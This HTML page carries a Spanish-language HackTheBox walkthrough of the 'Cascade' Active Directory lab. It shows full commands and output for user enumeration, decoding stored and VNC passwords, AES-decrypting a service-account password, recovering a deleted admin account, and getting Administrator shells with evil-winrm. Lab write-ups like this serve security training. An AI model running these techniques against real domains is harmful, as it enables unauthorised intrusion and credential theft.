<!doctype html>
<html
  lang="en-us" 
  
    data-theme-mode="true"
  
>
  <head>
    <meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/>







  

<title>
  Cascade | Fouen
</title>
<meta
  name="description"
  content="Web enjoyer"
/>










<script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"x转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"❗Failed❗\",\"success\":\"Success✔️\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"time\":null}}}");
</script>

<script>
  window.siteConfig.swPath = '\/sw.js';
</script>











  
  
  
    
  

  
  
  
    
  

  
    

<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>






  <link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  />



  







  
 <link rel="stylesheet" href="/css/loader.min.2ad0e9bbffb534e893c0ecefc44787a277cf851387e8ad9dccfbc3a5f0886dbe.css" />




  <meta property="og:type" content="website" />
  <meta property="og:title" content="Cascade | Fouen" />
  <meta
    property="og:description"
    content="Web enjoyer"
  />
  <meta property="og:url" content="https://fouen.github.io/post/hackthebox/cascade/" />
  <meta
    property="og:site_name"
    content="Fouen"
  />
  <meta
    property="og:image"
    content="/images/cascade.png"
  />
  <meta property="article:author" content="Fouen" />
  <meta property="article:published_time" content="2024-07-24T00:00:00&#43;00:00" />
  <meta property="article:modified_time" content="2024-07-24T00:00:00&#43;00:00" />
  
    <meta property="article:tag" content="Medium" />
  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/cascade.png" />
  
  
  
  
  




<link rel="shortcut icon" href="/favicon.ico">








  
<<<<<<< HEAD
 <link rel="stylesheet" href="/css/main.min.f1ffd7c8acdfbab9d0a86e5e3759fc9e212773dc01e2c2934203fc55420f8e27.css" />
=======
 <link rel="stylesheet" href="/css/main.min.cf73cf27e77f9541bc095208d0043dec410884804c1a00da7edb60b4436a1047.css" />
>>>>>>> f6e5130999cea55c03b1ce0a4218fec930c10d0f





  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />






  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />








  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
  ></script>





  


  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />





    
  </head>
  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <img src="/images/perfilsinfondo.png" alt="loading" />
        
      </div>
      <div class="loading-word">...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>


<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


  <div class="notification-wrapper">
    <h1>New version found</h1>
    <p>The website seems to have new content, do you want to update?</p>
    <div class="notification-btn">
      <button id="notification-update-btn">Update</button>
      <button id="notification-close-btn">Cancel</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        
<div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe632;
          
        </div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe62f;
          
        </div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
    
  </nav>
</div>
<header id="header">
  
    
    <picture></picture>
      <img fetchpriority="high" src="/images/cascade.png" alt="Cascade">
    
  

  <div id="header-outer">
    <div id="header-title">
      
        
        
          
        
  
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Cascade</h1>
          </a>
        
      
  
      
        
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>
        <div id="content"
          class="sidebar-left"
            >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    >
      
        <div class="sidebar-toc-sidebar">
          <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
      </ul>
    </li>
    <li><a href="#enumeración">Enumeración</a>
      <ul>
        <li><a href="#rpcclient">rpcclient</a></li>
        <li><a href="#smb">SMB</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
  </ul>
</nav>
  </div>
</div>
        </div>
        <div class="sidebar-common-sidebar hidden">
          
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">9</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

        </div>
      

      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
    
  </div>
</aside>

          <section id="main">
  <article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta">
      <div class="article-date">
  <a
    href="https://fouen.github.io/post/hackthebox/cascade/"
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2024-07-24 00:00:00 &#43;0000 UTC" itemprop="datePublished"
      >2024-07-24</time
    >
    <time style="display: none;" id="post-update-time"
      >2024-07-24</time
    >
  </a>
</div>

      <div class="article-category">
  
    <a
      class="article-category-link"
      href="/categories/hackthebox"
      data-aos="zoom-in"
      >HACKTHEBOX</a
    >
  
</div>

    </div>
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h2 id="reconocimiento">
<a class="header-anchor" href="#reconocimiento"></a>
Reconocimiento
</h2><h3 id="nmap">
<a class="header-anchor" href="#nmap"></a>
Nmap
</h3><p>Escaneamos la maquina para ver que puertos tiene abiertos:</p>
<pre tabindex="0"><code>nmap -p- --open -sS --min-rate 5000 -Pn -n 10.10.10.182
</code></pre><pre tabindex="0"><code>PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown
</code></pre><h2 id="enumeración">
<a class="header-anchor" href="#enumeraci%c3%b3n"></a>
Enumeración
</h2><h3 id="rpcclient">
<a class="header-anchor" href="#rpcclient"></a>
rpcclient
</h3><p>Con <code>rpcclient</code> podemos enumerar usuarios válidos en el sistema</p>
<pre tabindex="0"><code>&gt; rpcclient -U &#34;&#34; 10.10.10.182 -N -c &#34;enumdomusers&#34;

user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
</code></pre><p>Viendo estos posibles usuarios vamos a pasarlos a un archivo para intetar un <code>ASREProast Attack</code>:</p>
<pre tabindex="0"><code>&gt; rpcclient -U &#34;&#34; 10.10.10.182 -N -c &#34;enumdomusers&#34; | grep -oP &#34;\[.*?\]&#34; | grep -v &#34;0x&#34; | tr -d &#34;[]&#34;

CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft

&gt; touch users

&gt; rpcclient -U &#34;&#34; 10.10.10.182 -N -c &#34;enumdomusers&#34; | grep -oP &#34;\[.*?\]&#34; | grep -v &#34;0x&#34; | tr -d &#34;[]&#34; &gt; users
</code></pre><p>Probamos el <code>ASREProast Attack</code> con la herramienta <code>GetNPUsers.py</code>:</p>
<pre tabindex="0"><code>&gt; GetNPUsers.py cascade.local/ -no-pass -usersfile users

Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
</code></pre><p>No es vulnerable</p>
<p>Vamos a enumerar el <code>LDAP</code> usando la herramienta <code>ldapsearch</code>:</p>
<pre tabindex="0"><code>ldapsearch -x -H ldap://10.10.10.182 -b &#34;dc=cascade,dc=local&#34;
</code></pre><p>Es mucha información por lo que vamos a mandarlo a un archivo y abrirlo con <code>batcat</code> para filtrar mejor</p>
<p>Aquí podemos filtrar por <code>userPrincipalName</code> ahí suele salir bastante información sobre cada usuario y podemos llegar a ver información privilegiada:</p>
<pre tabindex="0"><code>userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133662716905734283
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
</code></pre><p>Podemos ver en la línea <code>cascadeLegacyPwd</code> una cadena en <code>base64</code>:</p>
<p>La de-codeamos:</p>
<pre tabindex="0"><code>&gt; echo &#34;clk0bjVldmE=&#34; | base64 -d; echo

rY4n5eva
</code></pre><p>Verificamos la contraseña con el usuario:</p>
<pre tabindex="0"><code>&gt; crackmapexec smb 10.10.10.182 -u &#34;r.thompson&#34; -p &#34;rY4n5eva&#34;

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
</code></pre><p>La contraseña es válida pero aún no podemos ganar acceso al sistema con herramientas como <code>psexec</code></p>
<p>Vamos a enumerar el <code>SMB</code> ahora que tenemos credenciales:</p>
<h3 id="smb">
<a class="header-anchor" href="#smb"></a>
SMB
</h3><p>Vemos que hay un directorio data, vamos a hacer un montura de este para poder movernos mejor:</p>
<pre tabindex="0"><code>sudo mount -t cifs &#34;//10.10.10.182/data&#34; /mnt/montura -o username=r.thompson,password=rY4n5eva
</code></pre><p>Dentro de la montura hacemos un <code>tree</code> para enumerar rápido el contenido:</p>
<pre tabindex="0"><code>tree -fas
[       4096]  .
├── [          0]  ./Contractors
├── [          0]  ./Finance
├── [          0]  ./IT
│   ├── [          0]  ./IT/Email Archives
│   │   └── [       2522]  ./IT/Email Archives/Meeting_Notes_June_2018.html
│   ├── [          0]  ./IT/LogonAudit
│   ├── [          0]  ./IT/Logs
│   │   ├── [          0]  ./IT/Logs/Ark AD Recycle Bin
│   │   │   └── [       1303]  ./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
│   │   └── [          0]  ./IT/Logs/DCs
│   │       └── [       5967]  ./IT/Logs/DCs/dcdiag.log
│   └── [          0]  ./IT/Temp
│       ├── [          0]  ./IT/Temp/r.thompson
│       └── [          0]  ./IT/Temp/s.smith
│           └── [       2680]  ./IT/Temp/s.smith/VNC Install.reg
├── [          0]  ./Production
└── [          0]  ./Temps
</code></pre><p>En <code>IT/Email Archives/Meeting_Notes_June_2018.html</code> vemos algo interesante:</p>
<pre tabindex="0"><code>-- New production network will be going live on Wednesday so keep an eye out for any issues.

-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).

-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.
</code></pre><p>Dice que se va usar un usuario que sera eliminado y que va a tener la misma contraseña que el admin. (Servirá mas adelante)</p>
<p>Vemos el contenido del archivo <code>VNC Install.reg</code>:</p>
<pre tabindex="0"><code>��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
&#34;ExtraPorts&#34;=&#34;&#34;
&#34;QueryTimeout&#34;=dword:0000001e
&#34;QueryAcceptOnTimeout&#34;=dword:00000000
&#34;LocalInputPriorityTimeout&#34;=dword:00000003
&#34;LocalInputPriority&#34;=dword:00000000
&#34;BlockRemoteInput&#34;=dword:00000000
&#34;BlockLocalInput&#34;=dword:00000000
&#34;IpAccessControl&#34;=&#34;&#34;
&#34;RfbPort&#34;=dword:0000170c
&#34;HttpPort&#34;=dword:000016a8
&#34;DisconnectAction&#34;=dword:00000000
&#34;AcceptRfbConnections&#34;=dword:00000001
&#34;UseVncAuthentication&#34;=dword:00000001
&#34;UseControlAuthentication&#34;=dword:00000000
&#34;RepeatControlAuthentication&#34;=dword:00000000
&#34;LoopbackOnly&#34;=dword:00000000
&#34;AcceptHttpConnections&#34;=dword:00000001
&#34;LogLevel&#34;=dword:00000000
&#34;EnableFileTransfers&#34;=dword:00000001
&#34;RemoveWallpaper&#34;=dword:00000001
&#34;UseD3D&#34;=dword:00000001
&#34;UseMirrorDriver&#34;=dword:00000001
&#34;EnableUrlParams&#34;=dword:00000001
&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
&#34;AlwaysShared&#34;=dword:00000000
&#34;NeverShared&#34;=dword:00000000
&#34;DisconnectClients&#34;=dword:00000001
&#34;PollingInterval&#34;=dword:000003e8
&#34;AllowLoopback&#34;=dword:00000000
&#34;VideoRecognitionInterval&#34;=dword:00000bb8
&#34;GrabTransparentWindows&#34;=dword:00000001
&#34;SaveLogToAllUsersPath&#34;=dword:00000000
&#34;RunControlInterface&#34;=dword:00000001
&#34;IdleTimeout&#34;=dword:00000000
&#34;VideoClasses&#34;=&#34;&#34;
&#34;VideoRects&#34;=&#34;&#34;
</code></pre><p>Vemos que hay un parámetro <code>password</code> en hexadecimal, vamos a decodearlo:</p>
<pre tabindex="0"><code>&gt; echo &#34;6b,cf,2a,4b,6e,5a,ca,0f&#34; | tr -d &#34;,&#34; | xxd -ps -r; echo

k�*KnZ�
</code></pre><p>Parece que nos devuelve un cadena no legible, como es un fichero de <code>VNC</code> vamos a usar una herramienta para de-codear contraseñas</p>
<p><a href="https://github.com/jeroennijhof/vncpwd">VNC decrypt</a></p>
<pre tabindex="0"><code>&gt; echo &#34;6b,cf,2a,4b,6e,5a,ca,0f&#34; | tr -d &#34;,&#34; | xxd -ps -r &gt; pass

&gt; ./vncpwd pass

Password: sT333ve2
</code></pre><p>El usuario al que pertenece esta contraseña creo que es <code>s.smith</code> ya que estaba dentro de un directorio con su nombre: <code>/IT/Temp/s.smith/VNC Install.reg</code>, vamos a verificarlo:</p>
<pre tabindex="0"><code>crackmapexec smb 10.10.10.182 -u &#34;s.smith&#34; -p &#34;sT333ve2&#34;
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
</code></pre><p>Efectivamente es válida</p>
<p>Vamos a probar a ver si es válido en <code>winrm</code>:</p>
<pre tabindex="0"><code>crackmapexec winrm 10.10.10.182 -u &#34;s.smith&#34; -p &#34;sT333ve2&#34;
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
HTTP        10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
</code></pre><p>Perfecto vamos a utilizar la herramienta <code>evil-winrm</code> para ganar acceso al sistema:</p>
<pre tabindex="0"><code>&gt; evil-winrm -i 10.10.10.182 -u &#34;s.smith&#34; -p &#34;sT333ve2&#34;

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents&gt;
</code></pre><h2 id="escalada-de-privilegios">
<a class="header-anchor" href="#escalada-de-privilegios"></a>
Escalada de Privilegios
</h2><p>Vemos que pertenecemos al grupo <code>Audit Share</code></p>
<pre tabindex="0"><code>&gt; net user s.smith

User name                    s.smith
Full Name                    Steve Smith
Comment
User&#39;s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</code></pre><p>Parece que es una carpeta compartida</p>
<pre tabindex="0"><code>&gt; net localgroup &#34;Audit Share&#34;

Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.
</code></pre><p>Vamos a acceder por <code>smb</code>:</p>
<pre tabindex="0"><code>&gt; smbmap -H 10.10.10.182 -u &#34;s.smith&#34; -p &#34;sT333ve2&#34; -r Audit$

[+] IP: 10.10.10.182:445	Name: cascade.local                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Audit$                                            	READ ONLY	
	.\Audit$\*
	dr--r--r--                0 Wed Jan 29 19:01:26 2020	.
	dr--r--r--                0 Wed Jan 29 19:01:26 2020	..
	fr--r--r--            13312 Tue Jan 28 22:47:08 2020	CascAudit.exe
	fr--r--r--            12288 Wed Jan 29 19:01:26 2020	CascCrypto.dll
	dr--r--r--                0 Tue Jan 28 22:43:18 2020	DB
	fr--r--r--               45 Wed Jan 29 00:29:47 2020	RunAudit.bat
	fr--r--r--           363520 Tue Jan 28 21:42:18 2020	System.Data.SQLite.dll
	fr--r--r--           186880 Tue Jan 28 21:42:18 2020	System.Data.SQLite.EF6.dll
	dr--r--r--                0 Tue Jan 28 21:42:18 2020	x64
	dr--r--r--                0 Tue Jan 28 21:42:18 2020	x86
</code></pre><p>Vamos a descargarnos estos archivos:</p>
<pre tabindex="0"><code>&gt; smbclient //10.10.10.182/Audit$ -U &#34;s.smith%sT333ve2&#34;

Try &#34;help&#34; to get a list of possible commands.

smb: \&gt; prompt off
smb: \&gt; recurse ON
smb: \&gt; mget *
</code></pre><p>Hay una base de datos vamos a abrirla con <code>sqlite3</code>:</p>
<pre tabindex="0"><code>sqlite3 Audit.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter &#34;.help&#34; for usage hints.
sqlite&gt; . tables
DeletedUserAudit  Ldap              Misc            
sqlite&gt; select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
</code></pre><p>Dentro de <code>Ldap</code> vemos una posible contraseña encriptada, después de ver las cadenas hardcodeadas en los archivos <code>CascAudit.exe</code> y <code>CascCrypto.dll</code> Vemos cosas interesantes:</p>
<p><code>CascAudit.exe</code>:</p>
<pre tabindex="0"><code>&gt; strings CascAudit.exe -e l

.5&lt;C
CascAudiot.Resources
Invalid number of command line args specified. Must specify database path only
Data Source=
;Version=3;
SELECT * FROM LDAP
Uname
Domain
c4scadek3y654321
Error decrypting password:
</code></pre><p>Vemos una contraseña y un mensaje de <code>Error decrypting password</code> esto nos da un pista y es que se esta utilizando un método de encriptado</p>
<p><code>CascCrypto.dll</code>:</p>
<pre tabindex="0"><code>&gt; strings CascCrypto.dll -e l

1tdyjCbY1Ix49842
CascCrypto.Resources
1tdyjCbY1Ix49842
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
FileDescription
AesCrypto
</code></pre><p>Vemos que menciona el método de encriptado <code>AES</code>, este necesita una contraseña y un <code>IV</code> (vamos a probar con <code>1tdyjCbY1Ix49842</code> ya que es la única cadena que podria serlo) vamos a probar de decodificarla ya que tenemos:</p>
<p><code>Password</code>: c4scadek3y654321
<code>IV</code>: 1tdyjCbY1Ix49842</p>
<p><img src="img/ciber.png" alt=""></p>
<p>Efectivamente tenemos la contraseña decodificada: <code>w3lc0meFr31nd</code></p>
<p>Vamos a verificar la contraseña:</p>
<pre tabindex="0"><code>&gt; crackmapexec smb 10.10.10.182 -u &#34;ArkSvc&#34; -p &#34;w3lc0meFr31nd&#34;

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd
</code></pre><p>Efectivamente es válida</p>
<p>Vamos a probar a ver si es válido en <code>winrm</code>:</p>
<pre tabindex="0"><code>&gt; crackmapexec winrm 10.10.10.182 -u &#34;ArkSvc&#34; -p &#34;w3lc0meFr31nd&#34;

SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
HTTP        10.10.10.182    5985   CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd (Pwn3d!)
</code></pre><p>Vemos que esta en el grupo <code>AD Recycle Bin</code></p>
<pre tabindex="0"><code>&gt; net user arksvc

User name                    arksvc
Full Name                    ArkSvc
Comment
User&#39;s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</code></pre><p>Como habíamos visto antes se eliminó un usuario que tenia la contraseña del Administrador como pertenecemos al grupo de <code>AD Recycle Bin</code> podemos llegar a ver su información:</p>
<pre tabindex="0"><code>get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq &#34;user&#34;} -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
</code></pre><p>Vamos a ver las propiedades:</p>
<pre tabindex="0"><code>cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
</code></pre><p>En una línea vemos esto, vamos a decodificarlo:</p>
<pre tabindex="0"><code>&gt; echo &#34;YmFDVDNyMWFOMDBkbGVz&#34; | base64 -d; echo

baCT3r1aN00dles
</code></pre><p>Como habíamos leído antes la contraseña del usuario eliminado era también la del usuario Administrador por lo que vamos a probar de conectarnos con esta contraseña:</p>
<pre tabindex="0"><code>evil-winrm -i 10.10.10.182 -u &#34;Administrator&#34; -p &#34;baCT3r1aN00dles&#34;
</code></pre><pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
cascade\administrator
</code></pre><p>Ya somos root!</p>

      
    </div>
    <footer class="article-footer">
      

      

      

      

      

      

      

      
      <ul class="article-tag-list" itemprop="keywords">
  
    <li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/medium"
        rel="tag"
        >MEDIUM</a
      >
    </li>
  
</ul>

    </footer>
  </div>
  
    
  
</article>










</section>
        </div>
        
        
        



  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  



<footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    <div>
      <span class="icon-copyright"></span>
      2024 -
      2026
      <span class="footer-info-sep "></span>
      Fouen
    </div>
    
    
      <div>
        <span class="icon-brush"
          >&nbsp;
            7.7k
          </span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;
          
          

          00:41
        </span>
      </div>
    
    
    
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
